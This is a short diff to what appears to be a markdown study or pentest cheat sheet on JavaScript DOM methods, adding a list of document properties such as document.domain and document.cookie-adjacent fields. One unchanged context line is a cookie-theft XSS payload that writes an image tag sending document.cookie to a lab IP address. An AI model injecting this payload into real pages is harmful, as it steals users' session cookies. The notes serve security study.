@@ -21,6 +21,21 @@ document.querySelectorAll('div');
 document.write('something');
 
 document.write('<img src="http://10.10.14.13/?'+document.cookie+'">');
+
+document.domain
+
+document.URL
+
+document.title
+
+document.doctype
+
+document.head
+
+document.body
+
+document.all
+
 ```
 
 ### Event Listeners 
